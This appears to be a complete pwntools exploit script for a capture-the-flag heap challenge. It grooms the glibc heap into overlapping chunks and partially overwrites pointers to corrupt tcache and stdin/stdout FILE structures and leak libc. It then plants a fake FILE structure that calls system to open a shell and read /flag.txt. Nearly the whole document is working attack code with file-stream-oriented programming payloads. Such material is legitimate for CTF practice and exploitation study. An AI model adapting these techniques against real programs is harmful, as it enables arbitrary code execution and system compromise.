from pwn import *
import builtins

class config:
    file: str = './patched'
    libc: str = './libc.so.6'
    port: int = 1339

file = None
if config.file:
    file = ELF(config.file, checksec=False)
    context.binary = file

libc = None
if config.libc:
    libc = ELF(config.libc, checksec=False)

context.terminal = ["/usr/bin/kitty"]

def dockerd(p, api=False):
    global g

    if not args.LOCAL:
        return
    
    p.recv(1)

    while True:
        sleep(.1)
        try:
            pid = (
                subprocess.run(
                    ["pgrep", "-fx", "/chall/a.out"],
                    check=True,
                    capture_output=True,
                    encoding="utf-8",
                )
                .stdout.strip()
                .splitlines()
            )
            if len(pid) == 0:
                continue

            log.info(f"pids: {pid}")
            if len(pid) != 1:
                log.error("more than one option")

            pid = int(pid[0])
            g = gdb.attach(
                pid, gdbscript=script, exe=config.file, sysroot=f"/proc/{pid}/root/", api=api
            )
            if api:
                g = g[1]
            break
        except subprocess.CalledProcessError:
            log.warn("failed pgrep")

def send(after: bytes, val, line = False):
    match type(val):
        case builtins.int | builtins.str:
            val = f"{val}".encode()
        case builtins.bytes:
            pass
    if line: val += b"\n"
    p.sendafter(after, val)

def sendline(after: bytes, val):
    send(after, val, True)

def connect():
    if args.REMOTE:
        p = remote(args.HOST or "localhost", args.PORT or config.port)
    elif args.GDB:
        p = gdb.debug([config.file], gdbscript=script)
    else:
        p = process([config.file])
    dockerd(p)
    return p

script = """
brva 0x14c5
c
heapbase
libc
python
print("getting info")
heapbase = gdb.execute("p $heapbase", to_string=True).split()[2]
libcbase = gdb.execute("p $libc", to_string=True).split()[2]
print("got info")

with open("/tmp/heap-pipe", "w") as f:
    f.write(heapbase + "\\n")
    f.write(libcbase + "\\n")

print("wrote info")
# if (int(libcbase, 0) & 0xf000) != 0x8000:
#     gdb.execute("q")
# if (int(heapbase, 0) & 0xf000) != 0x8000:
#     gdb.execute("q")
end
c
# set *(int *)($heapbase+0x340) ^= 0x60
# c
heap bins
tele (($heapbase&~0xffff)+0x10000) 16
"""

buffer = True
def alloc(idx: int, size: int, data: bytes = None):
    if data is None:
        size -= 1
        data = b"\0" * size

    if buffer:
        buf = b""
        buf += b"1".ljust(0x20, b"\0")
        buf += f"{idx}".encode().ljust(0x20, b"\0")
        buf += f"{size}".encode().ljust(0x20, b"\0")
        buf += data
        p.sendafter(b"> ", buf)
        for _ in range(3): p.recvuntil(b":")
        return idx

    p.sendafter(b"> ", b"1".ljust(0x20, b"\0"))
    sendline(b": ", idx)
    sendline(b": ", size)
    send(b": ", data)
    return idx

def free(idx: int):
    if buffer:
        p.sendafter(b"> ", b"2".ljust(0x20, b"\0") + f"{idx}".encode().ljust(0x20, b"\0"))
        for _ in range(1): p.recvuntil(b": ")
        return
    
    p.sendafter(b"> ", b"2".ljust(0x20, b"\0"))
    sendline(b": ", idx)

def edit(idx: int, data: bytes):
    p.sendafter(b"> ", b"3".ljust(0x20, b"\0"))
    sendline(b": ", idx)
    send(b": ", data)

def bp():
    p.sendafter(b"> ", b"4".ljust(0x20, b"\0"))

_tmp = 100
def tmp():
    global _tmp
    _tmp -= 1
    if _tmp < 0:
        log.error("overflow")
    return _tmp

while True:
    p = connect()
    _tmp = 100

    alloc(tmp(), 0x800)

    if args.LOCAL:
        import os
        try:
            os.unlink("/tmp/heap-pipe")
        except FileNotFoundError:
            pass
        os.mkfifo("/tmp/heap-pipe")
        bp()
        with open("/tmp/heap-pipe", "r") as f:
            heap = f.readline()
            libc = f.readline()
        heap = int(heap, 0)
        libc = int(libc, 0)
        log.info(f"{heap = :#x}")
        log.info(f"{libc = :#x}")
        # if (libc & 0xf000) != 0x8000:
        #     p.close()
        #     continue
        # if (heap & 0xf000) != 0x8000:
        #     p.close()
        #     continue
        # heap = 0x8000
        # libc = 0x8000
        break
    else:
        heap = 0x8000
        libc = 0x8000
        break

fd_dec = [alloc(tmp(), 0x18) for _ in range(0x18)]
bk_dec = [alloc(tmp(), 0x58) for _ in range(0x10)]

setup_large = 0x5f8
setup_large_cut = 0x5f8-0x20
setup_large_split = setup_large - setup_large_cut + 8
for i in range(0, 16, 1):
    alloc(0, setup_large)
    alloc(1, setup_large_split)
    free(0)
    alloc(0, setup_large_cut)
alloc(0, 0xff8)

alloc(0, 0xbe8)

pages = 0x20000 - (heap & 0xf000) >> 12
for _ in range(pages - 9):
    alloc(0, 0xff8)

def overlapping(stop=False, align=True, target: int = None):
    log.info("overlap")

    initextra = 0x80
    initsize = 0x438 + initextra
    overflowsize = 0x428
    triggersize = overflowsize + (initsize + 8)
    prevsize = 0xe08-(triggersize+8)
    asize = prevsize-0x10
    victimsize = 0x4f8
    bsize = prevsize+0x10
    fakesize = (prevsize + (triggersize+8)) & ~0xff
    reclaimsize = fakesize + victimsize
    csize = prevsize

    pages = [alloc(tmp(), 0xff8) for _ in range(3)]

    alloc(0, 0x428)
    a = alloc(tmp(), asize)
    alloc(tmp(), 0x428)
    b = alloc(tmp(), bsize)
    alloc(0, 0x428)
    c = alloc(tmp(), csize)
    alloc(0, 0x428)

    prev = alloc(tmp(), prevsize)

    alloc(0, 0x38)
    force = alloc(tmp(), initsize - initextra)
    alloc(0, 0x38)

    trigger = alloc(tmp(), overflowsize)

    victim = alloc(tmp(), victimsize)
    other = alloc(tmp(), 0x428)

    [free(i) for i in pages]

    free(a)
    free(b)
    free(prev)

    lo = target or 0x5030

    alloc(0, 0xff8)

    prev2 = alloc(0, prevsize, p64(0) + p32(fakesize | 1) + b"\0")

    b2 = alloc(b, bsize, b"X")
    edit(b2, p16(lo))
    a2 = alloc(a, asize, b"A")
    free(a2)
    free(victim)
    free(c)

    alloc(0, 0xff8)

    a3 = alloc(a, asize, p64(0))

    edit(a3, p64(0) + p16(lo))
    victim2 = alloc(victim, victimsize)
    c2 = alloc(0, csize)

    free(trigger)

    alloc(0, 0xff8)
    alloc(trigger, overflowsize, b"\0" * (overflowsize - 8) + p64(fakesize))

    free(victim2)

    a = alloc(tmp(), reclaimsize - 0x440, b"B")
    b = alloc(tmp(), 0x438 - 0x10, b"B")

    if align:
        used = (prevsize + 8) + (initsize + 8) + (overflowsize + 8) + (victimsize + 8) + (asize + 8) + (bsize + 8) + (csize + 8) + 0x3000 + 0x430 * 5
        needed = 0xfff8 - used
        alloc(0, needed & 0xfff)
        for _ in range(needed >> 12):
            alloc(0, 0xff8)

    return a, b, force, initsize - initextra, other

p.sendafter(b"> ", b"99".ljust(0x20, b"\0"))
p.recvuntil(b": ")
hint = u8(p.recvn(1)) - 0x0a
libc = ((hint & 0xff) << 16) | (libc & 0xf000)
log.info(f"{libc = :#x}")
ma = libc + 0x1d9c80
if (ma & 0xffffff) != ma:
    log.error("bad")
log.info(f"{ma = :#x}")

mp_tcache_max_bytes = 0x1d93b8
main_arena_top = 0x1d9c88

try:
    ra2, rb2, overlap2, overlapsize2, other2 = overlapping()
    ra3, rb3, overlap3, overlapsize3, other3 = overlapping(align=False)

    bigsize = 0x480
    big = alloc(tmp(), bigsize - 8)

    ra4, rb4, overlap4, overlapsize4, other4 = overlapping(align=False, target=0xbd90 - (0x600 - bigsize))
except EOFError:
    log.info("died...")
    exit(0)

free(ra3)
free(rb3)

fakesize = 0x490
fakedit = alloc(tmp(), 0x578, b"O")
alloc(1, 0xd78 - 0x10, b"Y")
edit(fakedit, b"\0" * 0x540 + p64(0x21) + p64(fakesize | 1))
edit(1, b"\0" * (0x7c0 - (0x800 - fakesize)) + p64(fakesize) + p64(0x21) + p64(0) * 2 + p64(0x21) * 2)

alloc(0, 0x5f8, b"I")
free(0)

free(overlap2)
alloc(0, overlapsize2 - 0x20, b"R")

free(ra2)
alloc(0, 0x968, b"Y")

thing = alloc(tmp(), 0x548 - 0x10, b"Z")
edit(thing, p64(0) + p16(((libc + main_arena_top - 0x10 - 0x10 - 4) & 0xffff)))

free(other4)
free(rb4)
free(ra4)

alloc(0, 0xff8, b"U")

edit(0, flat({
    0x500: 0x520,
    0x508: 0x41,
    0x548: 0x441,
    0x988: 0x41,
    0x9c8: 0x431,
    0xdf0: 0xe00,
    0xdf8: 0x500,
    0xeb8: 0xf531,
    0xb00: 0x490,
    0xb08: 0x21,
    0xb20: 0x21,
    0xb28: 0x21,
}, filler=b"\0"))
free(0)

part = alloc(tmp(), 0x628, b"Z")

free(overlap4)

alloc(overlap4, 0x128, b"PPX")
edit(overlap4, b"\0" * 0xd0 + p64(0x630) + p32(0x490 + 0x50 | 1))

alloc(0, 0x18)

free(part)

def tcache_counts(counts):
    c = dict()
    for idx, count in counts.items():
        c[idx * 2] = count
    for i in range(max(counts)):
        if i not in counts:
            c[i * 2] = 16
    return b"\0" * (0x6c0 - 0x20) + flat(c, word_size = 16)

fake_stdin_header_chunk = 0x1d9a7c
fake_stdin_vtable_chunk = 0x1d9b3c
fake_stdout_header_chunk = 0x1da714
fake_libc_file = 0x1d99a0

first = alloc(tmp(), 0x678 + 0x30, b"U")
edit(first, b"\0" * 0x6a0)
second = alloc(tmp(), 0x428, b"XXD")
free(first)
free(big)
free(overlap3)
alloc(first, 0x678, b"H")
free(second)

edit(fakedit, b"\0" * 0x540 + p64(0x21) + p64(fakesize | 1) + p16(0xc290))

[free(i) for i in fd_dec]
[free(i) for i in bk_dec]

alloc(0, 0x488, b"Z")
alloc(0, 0x7f8, b"O")

edit(0, p64(0) + p16(libc + fake_stdin_header_chunk & 0xffff))
alloc(1, 0x7f8, b"O")
edit(1, b"\0" * 0x14 + p64(0xfbad200b) + p64(0) * 3 + p16(libc + fake_libc_file & 0xffff))

edit(0, p64(0) + p16(libc + fake_stdin_vtable_chunk & 0xffff))
alloc(1, 0x7f8, b"O")
edit(1, b"\0" * 0x2c + p8(0x28))

edit(0, p64(0) + p16(libc + fake_stdout_header_chunk & 0xffff))
alloc(1, 0x7f8, b"O")
edit(1, b"\0" * 0x1c + p64(0xfbad0000 | 0x1000 | 0x800 | 2) + p64(0) * 3 + p8(0))

p.sendafter(b"> ", b"5".ljust(0x20, b"\0"))

leak = u64(p.recvn(8))
log.info(f"{leak = :#x}")
ll = ELF("./libc.so.6", checksec=False)
ll.address = leak - 0x1d98a0
log.info(f"{ll.address = :#x}")

fake_file                = FileStructure(0)
fake_file.flags          = u64(b'  sh\x00\x00\x00\x00')
fake_file._IO_write_ptr  = 1
fake_file._wide_data     = ll.address + fake_libc_file - 0x10
fake_file._lock          = ll.bss(0x400)
fake_file.chain          = ll.sym.system
fake_file.vtable         = ll.sym._IO_wfile_jumps
payload = bytes(fake_file)[:-0x10] + p64(ll.address + fake_libc_file) + bytes(fake_file)[-0x8:]
log.info(f"{len(payload) = :#x}")

payload = payload.ljust(0x100) + b"\0" * 0x68 + p64(ll.address + fake_libc_file)
p.send(payload.ljust(0x183, b"\0"))
p.sendline(b"id && uname -a && cat /flag.txt")

print("FLAG FlAg FlaG!!!")
p.interactive()
while True: pass